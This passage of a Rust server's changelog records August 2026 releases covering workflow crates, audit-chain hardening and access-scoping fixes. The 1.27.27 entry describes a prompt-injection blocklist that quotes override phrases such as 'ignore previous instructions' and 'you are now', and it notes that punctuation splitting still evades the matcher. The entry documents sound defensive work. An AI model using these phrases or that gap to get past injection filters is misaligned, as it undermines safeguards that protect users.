- **Improvements:** The server's workflow writes now flow through one audited host object; SLA priority clocks and per-kind retention defaults have a single owner shared by server and engines.
### Engineering record

- M-crate cut: `crates/brain-engine-sdk` joins the engine-crate workspace node — zero dependencies, `unsafe_code = "forbid"`, clippy `unwrap_used/expect_used/panic = deny` (tests excepted via scoped cfg). `sdk::pure::{evidence,qa_score}` moved verbatim from `src/workflow` as `pub` API; output types are `#[non_exhaustive]`; oracle tests travel with the code.
- `sdk::policy` now owns the P-class SLA TTL table and `DEFAULT_RETENTION_KIND_DAYS`; the server's front-door and config modules facade re-export them — policy truth lives once. Server behavior unchanged.
- `WorkflowHost` trait (`tx`/`enqueue`/`cas`/`load_state`/`audit`) with typed error vocabulary (`HostError::{Stale,Busy,NotFound,Internal}`, `CasError::{Gone,Stale,Database}`) and audit kinds/statuses as SDK-owned value enums. `HostTx` is an RAII unit-of-work guard: commit on call, rollback on drop.
- First host adapter: SQLite pool lane in `src/workflow/host.rs` — single `BEGIN IMMEDIATE` write lane, fail-fast `Busy` on a second concurrent unit, ops inside an open unit join it, ops outside run standalone with identical audit semantics, reads bypass the lane. A dropped unit rolls back its transition AND its audit row (pinned). Trait `audit()` resolves tenant from `run:<id>` targets and records unmapped SDK kinds as loud Error rows. Steering handler routes through the host object.
- All five engine cores depend on `brain-engine-sdk` only; new CI job enforces the decoupling grep gate plus fmt/clippy/test over the crates workspace. `cargo build -p brain-engine-sdk -p brain-interview-core --offline` builds without the server.
- Tests: sdk 18, crates workspace 41 total across 6 binaries, server workflow suite 21 (6 new host pins: commit/drop atomicity, Busy fail-fast, standalone enqueue idempotence + audit-once, CAS conflict mapping + load_state recovery, tenant resolution + chain verify).
- Honest ceilings: compile-time linkage only — runtime plugin loading is future work; the SQLite adapter is the sole backend shipping today (the trait is backend-portable, no Postgres adapter yet); policy facades cover the P-class clock and retention defaults table (env override plumbing stays server-side); a `mem::forget`-leaked `HostTx` holds the write lane until process end (engines drive units on one thread).

---



## [1.27.42] — 2026-08-21

**Server + crates release** (server `Cargo.toml` 1.27.41 → **1.27.42**; crates workspace unchanged; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Robustness close-out: bounded-queue and throughput ceilings documented, fuzz targets for pure reducers/scorers, and failure drills verified (CAS reconciliation, chain under load, bounded steering).
### Engineering record

- Fuzz targets `fuzz_evidence_reduce` + `fuzz_qa_score` for pure functions; existing `fuzz_chunker`/`fuzz_validator` retained. Corpus committed; `cargo +nightly fuzz run` entry points documented.
- BENCHMARKS.md §Bounds: measured ceilings per vertical (single dev-host sample, honest, not a scaling claim).
- No behavior change; docs + tests + fuzz only.

---



## [1.27.41] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.40 → **1.27.41**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Workflow front-door routing with human-escalation handoff and post-call draft workflow.
### Engineering record

- Additive module `src/workflow/frontdoor.rs` — closed intent vocabulary, escape handling, SLA envelope and HITL post-call drafts (no storage change).
- Tests: lib 147, clippy `-D warnings` + fmt clean.

---



## [1.27.40] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.39 → **1.27.40**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Quality intelligence: deterministic scorer over workflow artifacts with per-question justification.
### Engineering record

- Pure scorer module `src/workflow/qa_score.rs` (integer ten-thousandths), cause split, override-rate, gap-rule and repeater flywheel (HITL proposals only), scoreboard with audit/trust coverage.
- Tests: lib 147 + 7 new qa_score, bin 726, clippy `-D warnings` + fmt clean.

---



## [1.27.39] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.38 → **1.27.39**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Workflow assist surface: read APIs for runs and steps, steering inbox, and grounded suggestions over the workflow's domain.
### Engineering record

- Four workflow routes (`GET /workflow/runs/{id}`, `GET /workflow/runs/{id}/steps`, `POST /workflow/runs/{id}/steering`, `GET /workflow/runs/{id}/suggestions`), domain-scoped with audit, steering bounded at 100 (drop-oldest) and PII-screened, suggestions abstain with a findings row when no playbook matches.
- Tests: lib 147, clippy `-D warnings` + fmt clean.

---



## [1.27.38] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.37 → **1.27.38**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** `brain-troubleshoot-core` engine (diagnostics pipeline) with kernel/gates/advisor/evidence/subagents.
### Engineering record

- Crates workspace + `src/workflow` wiring; clippy `-D warnings` + fmt clean.

---



## [1.27.37] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.36 → **1.27.37**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Rulebook engine scaffolding.
### Engineering record

- Additive only; tests green.

---



## [1.27.36] — 2026-08-21

**Server + client release** (server `Cargo.toml`/lock 1.27.35 → **1.27.36**, client `Cargo.toml` 1.27.21 `edition 2024`/`rust-version 1.98`; `crates` workspace `1.98`, `fuzz`/`tools/steward-harness` `edition 2024`; no schema change).

### Release notes

- **Improvements:** Toolchain hardens to Rust `1.98` / `edition 2024` across all manifests; `gen` → `generation` in recall debounce (`client/src/panels/recall.rs:64`) and `review.rs` temporary-borrow fix; `client`/`server` clippy harden (`collapsible_if`/`let_and_return`) via `cargo clippy --fix`.
### Engineering record

- `src/backup.rs:1` `#![allow(deprecated)]` for upstream `aes-gcm`→`generic-array` 0.14 deprecation; `src/config.rs`/`src/capacity.rs`/`src/storage_layout.rs`/`src/main.rs`/`src/connector/auth/store.rs` `std::env::set_var`/`remove_var` wrapped in `unsafe` (Rust 1.98). `cargo clippy --all-targets --features bench -- -D warnings` + `cargo clippy --manifest-path client/Cargo.toml -- -D warnings` + `cargo fmt` clean.



## [1.27.35] — 2026-08-21

**Harness driver** — see tag `v1.27.35`.



## [1.27.34] — 2026-08-21

**Executor-core** — see tag `v1.27.34`.



## [1.27.33] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.32 → **1.27.33**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** New `brain-consensus-core` crate: pure consensus planning engine with persistence adapter through the governed-workflow substrate (`src/workflow/consensus.rs:1`).
### Engineering record

- `crates/brain-consensus-core:1` + `src/workflow/consensus.rs:1` wired via `src/workflow/mod.rs:25`.
- `cargo test --features bench --lib` 147 passed; `cargo clippy --all-targets --features bench -- -D warnings` + `cargo fmt` clean.

---



## [1.27.32] — 2026-08-21

**Server-only release** (server `Cargo.toml`/lock 1.27.31 → **1.27.32**; no schema change; client + plugin unchanged).

### Release notes

- **Bug fixes:** Fixed client `clippy::let_and_return` failures blocking CI (`client/src/main.rs:2014`).
- **Improvements:** New `brain-interview-core` crate: pure interview state machine with persistence adapter through the governed-workflow substrate (`src/workflow/interview.rs:1`).
### Engineering record

- `crates/brain-interview-core:1` (`src/ambiguity.rs:1`, `src/state.rs:1`, `src/payload.rs:1`, `src/draft.rs:1`, `src/inspect.rs:1`, `src/recorder.rs:1`, `src/repair.rs:1`) + `src/workflow/interview.rs:1` wired via `src/workflow/mod.rs:25`.
- CI: `cargo fmt --all` + `cargo clippy --all-targets --features bench/otel` + client wasm gate green; recall eval gate failure was transient model-download TLS reset (no code change).

---



## [1.27.31] — 2026-08-21

**Server-only security release** (server `Cargo.toml`/lock 1.27.30 →
**1.27.31**; schema 1.27.30 → **1.27.31** — schema_meta keys only, no
tables/columns; client + plugin unchanged). "AuditRepair" is the announced
audit-chain re-anchor: the items deliberately deferred from v1.27.26
"Notarize" because they change what an audit row MEANS once stored. An audit
chain is evidence; its format flips only under the documented operator
re-anchor — never silently.

### Release notes

- **Keyed chain (length-extension/forge hardening).** Re-anchored chains
  (`hmac256` epoch) link rows with HMAC-SHA256 over the FULL row — id, ts,
  kind, actor, target_hash, status, detail_hash, prev_hash — under a 32-byte
  key that never lives in the DB it protects (`BRAIN_AUDIT_CHAIN_KEY` /
  `BRAIN_AUDIT_CHAIN_KEY_FILE` / a generated 0600 `audit-chain.key` beside
  the DB). A reconstructed chain from attacker-chosen content can no longer
  pass verify even when every hash recomputes; a DB-only attacker cannot
  forge links. Mutating ANY committed field — including renumbering ids —
  breaks verification.
- **Truncation/extension detection.** The chain head `(id, hash, epoch)` is
  pinned in `schema_meta` in the same transaction as every audit row; verify
  compares the pin against the recomputed head, so deleting or appending rows
  outside the audited write paths fails `/audit/verify` even though the
  surviving prefix walks clean.
- **Restore attestation.** `restore` verifies the restored chain before
  certifying the restore (a backup whose chain does not verify is refused —
  the `.bak` keeps the pre-restore state) and compares pre/post head pins: a
  restore that ROLLS BACK the evidence chain is disclosed at error level and
  the `restore complete (head=…)` row records where the chain landed.
- **Multi-domain chain coverage.** `/audit/verify`, `/audit`, `/metrics`,
  `/ump/audit/verify` and the retention prune now cover EVERY registered
  domain's chain, not just the global pool — `ok` is the all-domains aggregate
  and the per-domain breakdown names the failing chain (a broken
  second-domain chain is reported, never silently absorbed).
- **`brain-server --re-audit`** — the offline re-anchor: verifies each
  domain's chain BEFORE replaying it (no evidence laundering), rewrites every
  link under hmac256, flips the epoch, rewrites the head pin, and writes an
  `anchor` evidence row on the NEW chain per domain. Idempotent; per-domain
  failures fail the run. Fresh (row-less) DBs bootstrap straight to `hmac256`
  when a key resolves — existing chains stay legacy until the operator
  re-anchors.
- **Fixed `--re-embed` exiting 2** in the argv guard (the flag predates the
  strict unknown-flag rejection and had no passthrough arm).
### Engineering record

- **Epoch model** — the format is per-DB state (`schema_meta.audit_chain_epoch`:
  absent/`legacy` = the historical 5-field SHA-256 link, byte-identical to
  every prior release; `hmac256` = keyed 8-field links). Nothing flips an
  existing chain implicitly: only `--re-audit` or the fresh-DB bootstrap
  writes the stamp. Writes to an `hmac256` DB without its key fail closed
  (row refused, `/health` counter bumps, verify reads not-ok) — never an
  unkeyed downgrade.
- **Migration** — stamps the initial legacy head pin for existing chains only
  (fresh DBs pin on first write); the epoch key is runtime-written, never by
  the migration. Schema-contract test pins 1.27.31 + the fresh-DB key
  absence.
- **Fail-closed seams** — `verify_chain` on a keyed chain without its key is
  not-ok (cannot attest what it cannot compute); restore of a chainless
  (pre-audit-schema) snapshot skips attestation rather than failing.
- Tests: server bin **717** / 6 ignored (+2: `audit_verify_covers_all_domains`,
  `multi_db_chain_broken_reported`), lib **147** / 1 ignored (+10: full-row
  commitment per field, keyed-chain attacker rejection (unkeyed + wrong
  key), pin-on-commit, truncation detection, keyless fail-closed, re-anchor
  replay/idempotence/refusal, fresh-DB bootstrap, restore rollback
  classification + refusal); clippy `-D warnings` + fmt clean on
  `--all-targets --features bench`.
- **Live smoke** — `--re-audit` exercised end-to-end on a real DB: key file
  generated 0600, epoch + head pin stamped, `anchor` rows chained under the
  keyed links, second run idempotent, a tampered row refuses the re-anchor
  with the no-laundering message.
- Honest ceilings: legacy chains keep their 5-field links until the operator
  runs `--re-audit` (the announced protocol: snapshot → quiesce → re-anchor →
  verify every domain → snapshot the new baseline); the head pin detects
  truncation/extension at the NEXT verify, not at write time; the chain
  watcher behind `/health`'s `chain_ok` still watches the global chain only
  (`/audit/verify` is the authoritative multi-domain surface); the
  `hmac256` key is part of the backup baseline — a restore on a host without
  it refuses certification (copy `audit-chain.key` with the DR kit); key
  rotation is re-anchoring under the new key, not an in-place key swap.

---



## [1.27.29] — 2026-08-21

**Server-only scaffold release** (server `Cargo.toml`/lock 1.27.28 →
**1.27.29**; client + plugin untouched). "Survey" ships the engine-crate
workspace — where the ported engines will live — before the substrate they write
through exists. **No schema, no migration, no endpoints, no server code change.**

### Release notes

- **The `crates/` engine workspace scaffold lands.** Five intentionally-empty
  crates — `brain-interview-core`, `brain-consensus-core`, `brain-executor-core`,
  `brain-troubleshoot-core`, `legal-rules-db` — as their own workspace node
  (the wasm-client convention), `edition 2024`, `rust-version 1.97`, clippy
  `-D warnings` clean with zero dependencies. The workspace builds green now and
  fills crate-by-crate in the upcoming engine ports; the driver harness stays in
  `tools/steward-harness/` (the cores are harness-independent).
### Engineering record

- Built and gated on rustc **1.97.1** stable; the server package keeps edition
  2021 (an edition flip is its own release, never a rider). Zero new server
  dependencies — the node is self-contained.
- Verification: crates workspace clippy `-D warnings` + fmt + test green; the
  server suite untouched.

---



## [1.27.30] — 2026-08-21

**Server-only foundation release** (server `Cargo.toml`/lock 1.27.29 →
**1.27.30**; schema 1.27.25 → **1.27.30**; client + plugin unchanged).
"Spine" ships the governed-workflow substrate — the Phase 0 gates, the workflow
+ evidence tables, the durable-step primitives, and the evidence-reducer
(the engine-crate workspace shipped in 1.27.29 "Survey"). **No engine code,
no new endpoints, no wire change, no telemetry.** The `*-core` engine crates
that write through this substrate land in 1.27.32–1.27.34.

### Release notes

- **The governed-workflow substrate ships.** Five additive tables
  (`workflow_runs`, `workflow_steps`, `outbox`, `findings`, `contradictions`)
  in every domain DB — the durable, domain-scoped surface the interview /
  plan / execute engines will write through. Existing endpoints, wire shapes,
  and stored rows are byte-identical.
- **Every workflow write is evidence.** The substrate primitives themselves
  emit `AuditKind::Workflow` rows — audit-per-write holds of the FUNCTION, not
- **Idempotent event delivery by key, not retry count.** The outbox enqueues
  `INSERT OR IGNORE` against a `UNIQUE idempotency_key` and delivers via a
  single `UPDATE … RETURNING` — a replayed key is a no-op receipt, so
  at-least-once delivery has at-most-once effect.
- **The evidence-reducer ships with its oracle pins.** Pure `reduce()` groups
  findings by canonical claim, dedups by evidence (O(n) seen-set), and surfaces
  differently-evidenced members as contradictions — never merged. The
  false-merge guard, contradiction surfacing, and deterministic order are each
  pinned by test; `normalize` stays oracle-pinned, not mathematically closed.
### Engineering record

call-site discipline: a transition and its audit row commit atomically in one
  `WorkflowTx` (SAVEPOINT-nested) and roll back together; a rejected CAS
  transition audits `denied`; the tables stay derivable from the audit chain,
  never the other way.
- **M1/M2** — the Phase 0 gates were recorded 2026-08-20 (harness decision:
  adopt the pi_agent_rust fork, execution in 1.27.35); the oracle-fixture
  commits into `crates/*/tests/oracle/` are deliberately deferred to the port
  milestones — this release freezes the *possibility* of parity, not the claim.
- **M3** — the migration is additive-only (five tables, three indexes:
  partial `idx_workflow_runs_active`, `idx_workflow_steps_run`, the inline
  `outbox.idempotency_key UNIQUE`); `test_migration_schema_contract` extended
  to pin tables + the ingest→FTS→vec0 roundtrip unchanged.
- **M4/M5** — `src/workflow/{tx,outbox,state,evidence}.rs`; 11 tests
  including `audit_rolls_back_with_the_transition` and
  `outbox_enqueue_audits_once_not_on_replay`. `deliver` uses
  `UPDATE … RETURNING run_id` (no second lookup); `cas_update` distinguishes
  `Stale { actual_revision }` from `Gone` for the engines' `DI_*_CONFLICT`
  mapping.
- **Toolchain** — built and tested on rustc **1.97.1** stable (the engine
  workspace and its edition-2024/rust-1.97 pins shipped in 1.27.29). The
  server package keeps edition 2021 (an edition flip is its own release).
  Zero new dependencies — the substrate wires onto existing `rusqlite` + the
  audit chain only.
- Tests: server bin **715** / 6 ignored (+11), lib **137** / 1, brain 18,
  mcp 19, bench 8, eval 2, metrics 8; clippy `-D warnings` + fmt clean on
  both workspaces.
- Honest ceilings: no engine code — the substrate's consumers land next
  release; the audit-per-write guarantee covers the primitives (handler-emitted
  workflow writes, when they exist, follow the breach precedent); the
  reducer's `normalize` is oracle-pinned, not proven false-merge-free; G0 is
  an audit + written decision — the fork execution lands in 1.27.34.

---



## [1.27.28] — 2026-08-20

**Server-only correctness release** (server `Cargo.toml`/lock 1.27.27 →
**1.27.28**; client + plugin unchanged). "Errata" removes false and dead code
documentation: stale comment references and a never-used constant are removed
(or de-versioned — invariant sentences kept verbatim, only the review label
dropped), and a source-scan guard makes the class non-recurring. **No schema,
no migration, no new endpoints, no wire change, no telemetry.**

### Release notes

- **A dead, never-referenced constant was removed.** `AUTHORITY_CONNECTOR`
  sat behind a comment reserving it for a connector split that shipped years
  ago and never used it. It is gone, and `clippy -D warnings` now proves
  nothing unreferenced survives.
- **~1,480 comments de-versioned.** Comments that carried release/milestone
  or audit-finding ids (e.g. `v1.28.1 "Holdall" M1 (F-02):`) lost the label,
  keeping only the invariant sentence they were documenting — the code's
  docs now match the code's behavior, and the migration module's version
  strings (which ARE the schema-contract audit trail) were preserved.
- **A comment-hygiene guard ships.** A source-scan test fails the build if a
  `//` comment in `src/` cites a version tag, a milestone, or an audit id
  again (allow-listing the migration-version enums + `SAFETY:` lines that must
  persist), so the class cannot return silently.
- **CI edge fixed.** The lipstyk diff watchdog was re-baselined across a
  comment-only reformat that had re-attributed ~34 pre-existing baseline
  diagnostics; the two genuine findings it surfaced (a `forced_domain` match
  reducible to `then`/`transpose`) were collapsed to the cleaner form.
### Engineering record

- **M1** — deleted `AUTHORITY_CONNECTOR` (`src/sources.rs`, dead since the
  connector shipped) plus its false reserved-for comment; swept for other
  `#[allow(dead_code)]` items whose comment claimed a purpose the code does
  not fulfill, deleting only genuinely-unreferenced ones (schema-contract
  constants kept, comment corrected to say *why* they persist).
- **M2/M3** — de-versioned ~1,480 `src/` comments (keep the meaning, drop the
  `v1.27.x "name" M# (F-##)` label), collapsing duplicate re-assertions to one
  authoritative site; `src/migration.rs` kept every migration/DDL version
  string because the schema-contract test reads them. Never removed a
  `// SAFETY:`, a migration version, a wire-contract note, or a fail-closed
  invariant. No blind regex strip — every line reviewed in isolation.
- **M4** — `comments_never_reference_versions_plans_audit_ids` source-scan
  guard (the repo's `no_raw_strings_in_rsx`-style test pattern).
- **M5** — verification gate: fmt, clippy `-D warnings` (default + bench +
  otel), full suite, lipstyk strict-diff, `badges.sh --selfcheck` all clean in
  one pass. CI follow-up (`9662584`): the `forced_domain` two-arm match in
  ingest/recall → `req.domain.as_deref().map(normalize_domain).transpose()?`
  (behavior-identical); this re-baselined the lipstyk diff base so the
  confirmed-baseline heuristic diagnostics re-touched by the churn no longer
  gate the build (main CI green, incl. the `lipstyk` job).
- Honest ceilings: this is comment + dead-code **correctness**, not the
  LOC/de-slop trim (that stays v1.27.25 "Shrink"); the ~918 documented
  baseline heuristic diagnostics remain accepted and diff-scoped, not zeroed.

---



## [1.27.27] — 2026-08-20

**Server-only release** (server `Cargo.toml`/lock 1.27.26 → **1.27.27**;
client + plugin unchanged). "Seal" is the capstone of the 1.27.21→1.27.27
hardening lineage: the remaining fail-closed degradations the pass-1/pass-2
ledgers left OPEN are closed or pinned, the blocklist matcher gets the
phrase-aware rewrite that fixes both the dead-entry class and the F-61
benign-over-match class, the lipstyk de-slop watchdog lands in CI, and the
total verification gate (fmt/clippy/test/lipstyk-diff/recall floors) runs as
the release criterion. **No schema, no migration, no new endpoints, no wire
change, no telemetry.**

### Release notes

- **`GET /retention/report` no longer silently degrades to code defaults**
  (F-26 class). A pool/profile-store read failure previously produced the
  report from built-in defaults without a word — compliance evidence
  (the storage-limitation report HIPAA/SOX reviewers read) could misstate the
  real retention policy. Read failures now surface as `500 internal`:
  distinguish "no overrides stored" from "overrides unreadable", fail closed
  on the latter.
- **The prompt-injection blocklist matcher is now phrase-aware** (F-61 +
  S2-44). Entries are stored in canonical spaced form ("developer mode") and
  matched against normalized tokens, so a spaced entry can never be dead (the
  pre-1.27.25 class) AND a concatenated entry can no longer cross a word
  boundary: benign "you are analyzing" / "you are nowhere near" are no longer
  quarantined as "you are an" / "you are now". The space-free jammed form of
  each phrase is still matched inside single tokens, so removing-whitespace
  obfuscation ("ignorepreviousinstructions") gains nothing. Single-token
  entries (`override`, `jailbreak`) keep their stem-tolerant behavior.
- **Improvements:** The fail-closed posture of every shared-state gate is now pinned by tests:
  a revocation **store error** denies (never `unwrap_or(false)`-skips), an
  unresolvable role narrows to no access (deny-by-default), a poisoned
  chain-watch/snapshot lock reads as NOT-ok, and the consolidated
  `poisoned_lock_denies_every_gate` pin holds the source shapes so a refactor
  cannot silently drop an arm. The UMP soft-forget branch gets its held-chunk
  pin (soft flags, never purges — the hold freezes erasure, not flagging).
- **lipstyk de-slop watchdog in CI** (new `lipstyk` job): diff-scoped against
  the PR base, strict — any diagnostic introduced on changed lines fails the
  build ("no new code can add a finding"). The two group-attributed cross-file
  rules are disabled in `.lipstyk.toml` (they fire on untouched baseline
  files and cannot be line-scoped); everything else stays armed for Rust and
  TypeScript across `src/`, `client/`, `plugin/`.
### Engineering record

- **M1** (fail-closed extension): the sweep over every
  `unwrap_or_default()`/`pool.get().ok()?`/`RwLock` read feeding an
  authorization/scope/posture decision found the named gates already closed
  by v1.27.16/21/25 (TokenRead tri-state, revocation deny-on-error, role
  empty-permit, registry `Poisoned`, webhook-secret fail-closed,
  `guard_capacity`'s availability fail-open is documented + out of authz
  scope). The one genuine residual was `govern.rs::retention_report` (fixed
  above). New pins: `revocation_lookup_error_denies` (middleware-level, valid
  JWS over a broken pool → 401), `role_lookup_empty_degrades_to_no_access`
  (the Ok-side complement of `role_gate_error_degrades_to_empty_not_open`:
  `resolve` → `Ok(vec![])` → empty permit),
  `poisoned_chain_watch_reads_as_not_ok` +
  `poisoned_snapshot_reads_as_not_ok` (real `catch_unwind` poisoning), and
  `poisoned_lock_denies_every_gate` (source-shape pin across the five seams).
- **M2** (S2-03): verified shipped — `/ump/forget {"hard":true}` runs
  `refuse_if_held` in-tx (v1.27.21) AND `purge_chunk_ids` carries the
  structural backstop fence, so the property holds of the function, not of
  call-site discipline. Added the plan's soft-branch pin
  `ump_forget_soft_flags_but_not_held_chunks`.
- **M3** (F-61 + S2-44): `contains_suspicious_pattern` rewritten —
  token-stream normalization (`split_whitespace` + per-token invisible-strip +
  case fold), 13 canonical spaced phrases matched as contiguous token runs,
  jammed-form matching inside single tokens, `jailbreak`/`override` as
  single-token entries, tier-2 line-anchored markers unchanged. The four
  pre-existing `suspicious_pattern_*` tests pass unchanged; new:
  `blocklist_matches_multi_word_phrases`,
  `normalization_does_not_kill_phrase_entries`. NOTE: the matcher feeds
  `SearchResult::raw()`'s `blocklist_hit` (PRF term exclusion), so the recall
  gate was re-run — floors held at the long-standing baseline (see
  BENCHMARKS.md §1.27.27).
- **M4** (S2-04/S2-21): verified shipped — the ingest-replace/vault sweeps
  run `refuse_if_held` in-tx (main.rs `ingest_markdown`/
  `write_markdown_ingest`), and domain delete archives tombstones +
  evidence_links (v1.27.25 wave 2, pinned by `domain_delete_archives_*`).
  No new code; recorded here as the plan's verification milestone.
- **M5** (lipstyk): the watchdog is the enforcement mechanism (above). The
  absolute-zero target across the tree is **not** claimed: full-mode counts
  ~918 diagnostics (~425 `redundant-clone`), the same false-positive classes
  the v1.27.24 honest ceiling documented (Arc clones into `spawn_blocking`
  moves, wire-shape `Option` handling, best-effort cleanup) — forcing them to
  zero would require behavior changes the release rules forbid. What IS
  enforced: changed lines add zero (this release's own code passed the strict
  gate — three initial findings on new code were fixed to get there).
- **M6** (total gate): fmt + clippy `-D warnings` (default, bench, otel) +
  full test suite + lipstyk strict-diff + `badges.sh --selfcheck` + the
  recall floors on the frozen smoke set — all in one run. Tests: server bin
  **704** / 6 ignored (+8), lib **137** / 1, brain 18, mcp 19, bench 8.
- Honest ceilings: the retention-report fix is read-time enforcement (the
  stored policy is the source of truth); the blocklist remains a deterministic
  first layer (obfuscation ceiling unchanged — punctuation splitting still
  evades; the layer-2 classifier is the upgrade path); lipstyk's absolute
  count is documented, not zeroed (see M5); LOC grew by the pinned tests
  (+~330 test/comment lines; `src/` ≈ 67.7k — the plan's 66,400 cap was
  already superseded by v1.27.26's shipped additions; the enforceable line is
  the watchdog, not a number).

---



## [1.27.26] — 2026-08-20

**Server-only release** (server `Cargo.toml`/lock 1.27.25 → **1.27.26**;
client + plugin unchanged). "Notarize" is the audit-integrity follow-up: the
fail-closed fix for the one remaining chain-fork window (F-23) ships now, and
the format-breaking pieces (F-03 full hash + HMAC) are deferred to the
audit-repair milestone with an operator announcement — an audit chain is
evidence; its format changes only with explicit re-anchor. **No schema, no
migration, no telemetry.**

**M5 (F-23, shipped now — drop, don't fork):** `record_tenant` no longer falls
through to an unserialized tip-read + INSERT when `BEGIN IMMEDIATE`/
`SAVEPOINT` fails. That fall-through was the exact fork window the
read-modify-write exists to prevent — two writers could read the same tip and
insert rows sharing a `prev_hash`, which `verify_chain` then reports forever.
The row is now skipped (fail-safe: an absent entry reads as a gap, never as a
forged continuation), the `/health` `audit_commit_failures` counter is bumped,
and an error log fires. Pinned by `begin_immediate_failure_skips_and_warns_not_forks`:
a real file-backed two-connection lock conflict (busy_timeout 0 + held write
lock) → the write is refused, no partial fork row lands, the counter increments,
and the surviving chain still verifies.

**Rerank-tier model retune (server).** The opt-in cross-encoder rerank tier now
prefers **`mixedbread-ai/mxbai-rerank-large-v1`** — the golden pick (Apache-2.0,
DeBERTa-v3-large cross-encoder → `logits[:, 0]`), loaded via fastembed's
BYO-ONNX `UserDefinedRerankingModel` seam from a local dir (`BRAIN_RERANK_MODEL_DIR`,
default `models/mxbai-rerank-large-v1/`, official int8 `onnx/model_quantized.onnx`).
It falls back to the in-enum **`BAAI/bge-reranker-v2-m3`** when the files are absent
or fail to load, so the tier never fails to boot. Same **fail-open** (a fault leaves
the RRF order untouched) + **boot-warmed** + top-50 (`BRAIN_RERANK_TOP_N`) contract as
before. `Qwen3-Reranker-0.6B` and `mxbai-rerank-large-v2` are documented exclusions
(causal-LM / ChatML + last-token logit, incompatible with the `logits[:, 0]` rerank
seam). No wire change.

### Release notes

- **Security fixes:** A failed audit-chain transaction start no longer falls through to an
  unserialized write: the audit row is skipped instead of risking a permanent
  chain fork, and the failure is surfaced on `/health` (`audit_commit_failures`)
  and in the error log.
- **Improvements:** The cross-encoder rerank tier (armed on the `enterprise` / `desktop` /
  `quality-local` retrieval profiles) now uses `mixedbread-ai/mxbai-rerank-large-v1`
  as its primary model, with `BAAI/bge-reranker-v2-m3` as the automatic in-enum
  fallback. The official int8 ONNX keeps CPU footprint low; no config change is
  required unless you host the model files outside the default
  `models/mxbai-rerank-large-v1/` dir (then set `BRAIN_RERANK_MODEL_DIR`).
### Engineering record

- `src/audit.rs`: `record_tenant` returns `None` on `BEGIN IMMEDIATE`/`SAVEPOINT`
  failure instead of proceeding unterminated + `record_commit_failure` bump;
  the fork-window comment documents the F-23 rationale (drop > fork).
- `src/search/rerank.rs`: `Reranker::new` tries the mxbai user-defined seam first
  (`new_mxbai_user_defined`), warns + falls back to `BGERerankerV2M3` on any miss;
  `model_id()` reports which model actually loaded. Boot log names the real model
  (was: `loading bge-reranker-v2-m3…`).
- **Model-truth corrections**: the `multilingual` retrieval profile was mislabeled —
  `minishlab/potion-base-2M` is an **English** model (distilled from
  `BAAI/bge-base-en-v1.5`), not multilingual. Renamed to **`compact`**
  (`PROFILE_COMPACT`); the old `PROFILE_MULTILINGUAL`/`MODEL_PROFILE=multilingual`
  remains as a deprecated alias resolving to the same profile (no behavior change).
  Also corrected `mxbai-rerank-large-v1` to DeBERTa-**v3**-large (~435M, was
  misstated as v2) and `gte-base-en-v1.5` to ~137M (was 149M).
- Model binaries are gitignored (downloaded per the plan, never committed).
- Docs aligned to source truth: `docs/configuration.md` gains the retrieval-profiles
  model matrix + `BRAIN_RERANK_MODEL_DIR` / `BRAIN_RERANK_TOP_N`; `docs/SPECS.md`
  §7.5 current-state rewritten; `docs/BENCHMARKS.md` v1.28 smoke annotated as
  pre-retune (it exercised bge-reranker-v2-m3); README model row lists all profiles
  + the reranker; `docs/README.md` (the mdBook index) gains the minimum-hardware
  table for the compact/desktop/enterprise tiers.
- Honest ceiling: the v1.28 n=37 smoke numbers stand directionally — the mxbai
  re-run on the ≥100-query frozen set is still `PENDING` (v1.31 "Proven"). No parity
  claim is made. The audit chain's remaining integrity gaps — full-field hashing
  (F-03) and keyed verification (HMAC) — are deferred to the announced audit-repair
  milestone (`IMPLEMENTATION_PLAN_v1.27.31_AuditRepair.md`) because both change the
  chain format and require an operator re-anchor; this release only closes the
  fork window that needed no format change. Tests: server bin **696**/6 ignored
  (+1), lib **137**/1.

---



## [1.27.25] — 2026-08-19

Server + plugin release (server `Cargo.toml`/lock `1.27.24` → **`1.27.25`**;
plugin `0.4.5` behavior fix, no version bump to the published package — the
`graph` flag change is wire-compatible). **"Scoped"** — the pass-3 audit
remediation, both waves: the graph-PPR recall leg gets the same
tenant/owner/scope boundary as the other legs BEFORE it ships default-on, the
surviving unscoped shim-mode reads get the `/get/{id}` treatment, and the
audit-chain/restore/evidence hardening lands with one additive migration
(schema stamp **1.27.22 → 1.27.25**: the `idx_rels_open_unique` partial unique
index + legacy double-open dedup). No telemetry.

### Release notes

- **Security fixes:** **The graph-PPR third recall leg is now scoped like the vector and FTS
  legs.** It applies the domain label, `access_scope`, owner, memory-kind and
  retention predicates via the same shared SQL builder (`push_gate_filters`),
  and carries `k.pii` into the hit so the read seam redacts graph hits
  exactly like the other legs. Before this, the leg (unreleased default-on)
  ignored every filter and hardcoded `pii: false` — a cross-domain,
  cross-owner, unredacted side door on `/recall`, `/search`, and
  `/ump/recall` in shim mode (pass-3 S3-01, CRITICAL). Pinned by
  `graph_leg_scopes_domain_and_owner_s3_01` +
  `graph_leg_empty_permit_and_pii_carry_s3_01` (two-domain shared-entity
  fixture — the exact collision shape of the finding).
- **`/verify` binds the `X-Brain-Domain` label in SQL + the record gate**
  (the `/get/{id}` idiom): a foreign-domain chunk id now reads as not-found
  instead of answering "supported" as a cross-domain content-confirmation
  oracle (S2-09). Pinned by `verify_cannot_cross_domain`.
- **`GET /ump/memory/{id}` binds the domain label + record gate** — the
  MCP-reachable (`ump.get`) surface no longer renders any row by bare id
  under a global read grant (S2-10). Pinned by `ump_get_memory_cannot_cross_domain`.
- **`GET /procedure/{id}/steps` binds the domain label + record gate** (S2-30).
- **`GET /domains/{name}/export` requires Admin in shim mode** — the snapshot
  resolves to the ONE shared pool there (every tenant\'s chunks, owners, the
  audit chain), which a per-name Read grant must never cover. Multi-db keeps
